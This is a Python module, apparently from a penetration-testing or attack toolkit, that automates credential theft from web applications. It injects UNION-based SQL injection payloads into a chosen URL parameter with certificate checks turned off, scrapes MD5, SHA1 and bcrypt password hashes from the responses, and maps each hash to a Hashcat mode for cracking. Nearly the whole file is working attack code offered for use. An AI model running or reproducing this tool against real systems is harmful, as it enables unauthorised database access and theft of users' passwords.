"""
Hash Discovery Service
Extracts password hashes from compromised systems for Hashcat testing
"""

import re
import requests
from typing import Dict, List
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from config import get_config
from utils.logger import setup_logger

config = get_config()
logger = setup_logger('hash_discovery')

class HashDiscoveryService:
    """Discover password hashes from vulnerabilities"""
    
    def __init__(self):
        self.logger = logger
        self.session = requests.Session()
    
    def discover_hashes_from_sqli(self, url: str, parameter: str, injection_technique: str) -> List[str]:
        """
        Extract password hashes from SQL injection vulnerability
        
        Args:
            url: Vulnerable URL
            parameter: Vulnerable parameter name
            injection_technique: Type of SQLi (error-based, boolean, time)
        
        Returns:
            List of discovered password hashes
        """
        self.logger.info(f"Attempting hash extraction from {url} via {parameter}")
        
        hashes = []
        
        try:
            if injection_technique == 'Error-based SQL Injection':
                hashes = self._extract_via_union(url, parameter)
            
            elif injection_technique in ['Boolean-based Blind SQL Injection', 'Time-based Blind SQL Injection']:
                self.logger.info("Blind SQLi detected - hash extraction would be time-consuming")
                self.logger.info("Recommendation: Use SQLMap for automated extraction")
        
        except Exception as e:
            self.logger.error(f"Hash extraction failed: {str(e)}")
        
        return hashes
    
    def _extract_via_union(self, url: str, param: str) -> List[str]:
        """Extract hashes using UNION-based SQLi"""
        
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)
        
        if param not in base_params:
            return []
        
        original_value = base_params[param][0]
        
        # Common password table/column names
        hash_queries = [
            f"{original_value}' UNION SELECT username,password FROM users--",
            f"{original_value}' UNION SELECT user,pass FROM accounts--",
            f"{original_value}' UNION SELECT login,pwd FROM members--",
            f"{original_value}' UNION SELECT email,password FROM user_table--",
        ]
        
        discovered_hashes = []
        
        for payload in hash_queries:
            test_params = base_params.copy()
            test_params[param] = [payload]
            
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, urlencode(test_params, doseq=True), parsed.fragment
            ))
            
            try:
                response = self.session.get(test_url, timeout=5, verify=False)
                
                # Extract MD5 hashes (32 hex characters)
                md5_hashes = re.findall(r'\b[a-f0-9]{32}\b', response.text)
                discovered_hashes.extend(md5_hashes)
                
                # Extract SHA1 hashes (40 hex characters)
                sha1_hashes = re.findall(r'\b[a-f0-9]{40}\b', response.text)
                discovered_hashes.extend(sha1_hashes)
                
                # Extract bcrypt hashes
                bcrypt_hashes = re.findall(r'\$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}', response.text)
                discovered_hashes.extend(bcrypt_hashes)
                
                if discovered_hashes:
                    self.logger.info(f"✅ Found {len(discovered_hashes)} password hashes!")
                    break
            
            except Exception as e:
                continue
        
        # Remove duplicates
        return list(set(discovered_hashes))
    
    def get_hash_type(self, hash_value: str) -> Dict:
        """
        Identify hash type from hash string
        
        Returns:
            Dict with hash_type (for Hashcat) and hash_name
        """
        hash_len = len(hash_value)
        
        # MD5
        if hash_len == 32 and re.match(r'^[a-f0-9]{32}$', hash_value):
            return {'hash_type': 0, 'hash_name': 'MD5'}
        
        # SHA1
        elif hash_len == 40 and re.match(r'^[a-f0-9]{40}$', hash_value):
            return {'hash_type': 100, 'hash_name': 'SHA1'}
        
        # SHA256
        elif hash_len == 64 and re.match(r'^[a-f0-9]{64}$', hash_value):
            return {'hash_type': 1400, 'hash_name': 'SHA256'}
        
        # SHA512
        elif hash_len == 128 and re.match(r'^[a-f0-9]{128}$', hash_value):
            return {'hash_type': 1700, 'hash_name': 'SHA512'}
        
        # bcrypt
        elif hash_value.startswith('$2'):
            return {'hash_type': 3200, 'hash_name': 'bcrypt'}
        
        # NTLM (same length as MD5, need context)
        elif hash_len == 32:
            return {'hash_type': 1000, 'hash_name': 'NTLM (or MD5)'}
        
        else:
            return {'hash_type': None, 'hash_name': 'Unknown'}

# Create instance
hash_discovery_service = HashDiscoveryService()